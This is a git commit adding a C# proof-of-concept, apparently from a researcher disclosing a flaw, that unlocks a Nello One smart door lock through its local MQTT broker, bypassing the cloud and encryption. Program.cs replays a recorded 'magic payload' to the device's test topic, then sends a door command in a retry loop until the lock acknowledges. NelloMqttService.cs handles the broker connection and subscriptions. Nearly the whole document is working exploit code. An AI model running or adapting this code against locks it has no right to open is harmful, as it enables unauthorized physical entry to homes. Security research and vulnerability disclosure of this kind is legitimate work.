0db83eb6491ca125f4a2229ecac9fc76b2f5bf7d
LFE89 <60022287+LFE89@users.noreply.github.com>
2020-03-10 02:30:38 +0100

    PoC commit

---
+++ NelloOne_ProofOfConcept/Program.cs
@@ -0,0 +1,126 @@
+﻿using Microsoft.Extensions.DependencyInjection;
+using Microsoft.Extensions.Logging;
+using NelloOneTest.Services;
+using System;
+using System.Threading.Tasks;
+
+namespace NelloOneTest
+{
+    /// <summary>
+    /// Copyright (C) 2020 Lars D. Feicho
+    /// 
+    /// Proof of concept
+    /// Nello (nello.io) open door without cloud (security issue)
+    ///
+    /// This program is free software: you can redistribute it and/or modify
+    /// it under the terms of the GNU General Public License as published by
+    /// the Free Software Foundation, either version 3 of the License, or
+    /// (at your option) any later version.
+    /// This program is distributed in the hope that it will be useful,
+    /// but WITHOUT ANY WARRANTY; without even the implied warranty of
+    /// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.See the
+    /// GNU General Public License for more details.
+    /// You should have received a copy of the GNU General Public License
+    /// along with this program.If not, see<http://www.gnu.org/licenses/>.
+    /// </summary>
+    class Program
+    {
+        // Change this magic payload to your device specific payload
+        private static string testTopicMagicPayload = "INSERT_YOUR_RECORDED_TEST_MESSAGE_HERE\n";
+        private static string doorTopicMagicPayload = "\"\"";
+
+        // Change this id to your nello device id
+        private static string nelloDeviceId = "INSERT_YOUR_DEVICE_ID_2_HERE";
+        private static bool isExpectedResponseReceived = false;
+
+        static async Task Main(string[] args)
+        {
+            var serviceCollection = new ServiceCollection();
+            ConfigureServices(serviceCollection);
+            var serviceProvider = serviceCollection.BuildServiceProvider();
+            var logger = serviceProvider.GetService<ILogger<Program>>();
+            var mqttService = serviceProvider.GetService<IMqttService>();
+            mqttService.AckOnlineSequenceReceived += MqttService_AckOnlineSequenceReceived;
+
+            try
+            {
+                Console.WriteLine("Local network nello usage");
+                Console.WriteLine("Encryption bypass PoC");
+                Console.WriteLine("---------------------------");
+
+                Console.WriteLine("Connecting to MQTT broker..");
+                await mqttService.ConnectToBrokerAsync();
+                Console.WriteLine("Connected");
+
+                bool isProcessing = true;
+                while (isProcessing)
+                {
+                    Console.WriteLine("Enter 'open' to open your door, or 'exit' to quit the programm.");
+
+                    var inputCommand = Console.ReadLine();
+                    if (!string.IsNullOrEmpty(inputCommand))
+                    {
+                        if (string.Equals("open", inputCommand.ToLower()))
+                        {
+                            isExpectedResponseReceived = false;
+                            int counter = 0;
+
+                            // We try a max send sequence of 15 times
+                            // In avg. nello opened my lock on the third try
+                            while (!isExpectedResponseReceived && counter < 15)
+                            {
+                                // Send magic payload to test topic
+
+                                await mqttService.SendMessageAsync(string.Format("/nello_one/{0}/test/", nelloDeviceId), testTopicMagicPayload);
+
+                                // Delay - in my case - necessary
+                                // Give nello some time to prepare for the next message
+                                // Maybe you need to increase your delay value
+
+                                await Task.Delay(500);
+
+                                // Send magic payload to door topic
+
+                                await mqttService.SendMessageAsync(string.Format("/nello_one/{0}/door/", nelloDeviceId), doorTopicMagicPayload);
+                                Console.WriteLine("Commands sent");
+
+                                // Delay included to have some time to react to nello responses (MqttService_AckOnlineSequenceReceived)
+                                await Task.Delay(1000);
+                                counter += 1;
+                            }
+
+                            if(!isExpectedResponseReceived || counter >= 15)
+                            {
+                                Console.WriteLine("Please make sure that you've used your 'testTopicMagicPayload' value and check if your lock is already unlocked.");
+                            }
+                        }
+                        else if (string.Equals("exit", inputCommand.ToLower()))
+                        {
+                            isProcessing = false;
+                        }
+                    }
+                }
+            }
+            catch(Exception ex)
+            {
+                logger.LogError("Main error:\n" + ex.ToString());
+            }
+        }
+
+        private static void MqttService_AckOnlineSequenceReceived(object sender, EventArgs e)
+        {
+            isExpectedResponseReceived = true;
+        }
+
+        private static void ConfigureServices(IServiceCollection services)
+        {
+            services.AddSingleton<IMqttService, NelloMqttService>();
+            services.AddLogging(configure => configure.AddConsole())
+                    .AddTransient<Program>();
+        }
+    }
+}
+
+
+
+ 
---
+++ NelloOne_ProofOfConcept/Services/NelloMqttService.cs
@@ -0,0 +1,155 @@
+﻿using Microsoft.Extensions.Logging;
+using MQTTnet;
+using MQTTnet.Client;
+using MQTTnet.Client.Options;
+using System;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace NelloOneTest.Services
+{
+    /// <summary>
+    /// Copyright (C) 2020 Lars D. Feicho
+    /// 
+    /// Proof of concept
+    /// Nello (nello.io) open door without cloud (security issue)
+    ///
+    /// This program is free software: you can redistribute it and/or modify
+    /// it under the terms of the GNU General Public License as published by
+    /// the Free Software Foundation, either version 3 of the License, or
+    /// (at your option) any later version.
+    /// This program is distributed in the hope that it will be useful,
+    /// but WITHOUT ANY WARRANTY; without even the implied warranty of
+    /// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.See the
+    /// GNU General Public License for more details.
+    /// You should have received a copy of the GNU General Public License
+    /// along with this program.If not, see<http://www.gnu.org/licenses/>.
+    /// </summary>
+    public class NelloMqttService : IMqttService
+    {
+        private const string SERVER_ADDRESS = "192.168.8.3";
+        private const int SERVER_PORT = 1883;
+        private const string DEVICE_ID = "INSERT YOUR DEVICE ID 2 HERE";
+        private const string TOPIC_PREFIX = "/nello_one/";
+
+        private readonly ILogger<NelloMqttService> _logger = null;
+
+        private IMqttClient _client;
+        private string[] _mqttListeningTopics = new string[] {"n_online/", "n_ACK/" };
+
+        public event EventHandler AckOnlineSequenceReceived = delegate { };
+
+
+        public NelloMqttService(ILogger<NelloMqttService> logger)
+        {
+            logger = _logger;
+
+            var factory = new MqttFactory();
+            _client = factory.CreateMqttClient();
+        }
+
+        public async Task ConnectToBrokerAsync()
+        {
+            try
+            {
+                var options = new MqttClientOptionsBuilder()
+             .WithTcpServer(SERVER_ADDRESS, SERVER_PORT)
+             // .WithCredentials(USERNAME, PASSWORD)
+             .Build();
+
+                _client.UseDisconnectedHandler(async e =>
+                {
+                    try
+                    {
+                        await _client.ReconnectAsync();
+                    }
+                    catch (Exception ex)
+                    {
+                        _logger.LogError("UseDisconnectedHandler error:\n" + ex.ToString());
+                    }
+                });
+
+                _client.UseConnectedHandler(async e =>
+                {
+                    try
+                    {
+                        foreach(var topic in _mqttListeningTopics)
+                        {
+                            await SubscribeToTopicAsync(string.Format("{0}{1}/{2}", TOPIC_PREFIX, DEVICE_ID, topic));
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        _logger.LogError("UseConnectedHandler error:\n" + ex.ToString());
+                    }
+                });
+
+                _client.UseApplicationMessageReceivedHandler(e =>
+                {
+                    try
+                    {
+                        if (e.ApplicationMessage.Topic.StartsWith("/nello_one"))
+                        {
+                            if (e.ApplicationMessage.Topic.StartsWith(string.Format("{0}{1}/{2}", TOPIC_PREFIX, DEVICE_ID, _mqttListeningTopics[1])))
+                            {
+                                // Message received 
+                                // Do stuff here
+                                OnAckOnlineSequenceReceived(new EventArgs());
+                            }
+
+                            Console.WriteLine(string.Format("{0}: {1}", e.ApplicationMessage.Topic, Encoding.UTF8.GetString(e.ApplicationMessage.Payload)));
+  
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        _logger.LogError("UseApplicationMessageReceivedHandler error:\n" + ex.ToString());
+                    }
+                });
+
+                await _client.ConnectAsync(options);
+            }
+            catch (Exception ex)
+            {
+                _logger.LogError("ConnectToBrokerAsync error:\n" + ex.ToString());
+            }
+        }
+
+        public async Task SendMessageAsync(string topicName, string message)
+        {
+            try
+            {
+                await _client.PublishAsync(topicName, message, MQTTnet.Protocol.MqttQualityOfServiceLevel.AtLeastOnce ,false);
+            }
+            catch (Exception ex)
+            {
+                _logger.LogError("SendMessageAsync error:\n" + ex.ToString());
+            }
+        }
+
+        public async Task SubscribeToTopicAsync(string topicName)
+        {
+            try
+            {
+                await _client.SubscribeAsync(new TopicFilterBuilder().WithTopic(topicName).Build());
+            }
+            catch (Exception ex)
+            {
+                _logger.LogError("SubscribeToTopicAsync error:\n" + ex.ToString());
+            }
+        }
+
+        public void OnAckOnlineSequenceReceived(EventArgs eventArgs)
+        {
+            try
+            {
+                AckOnlineSequenceReceived?.Invoke(this, eventArgs);
+            }
+            catch (Exception ex)
+            {
+                _logger.LogError("OnAckOnlineSequenceReceived error:\n" + ex.ToString());
+
+            }
+        }
+    }
+}
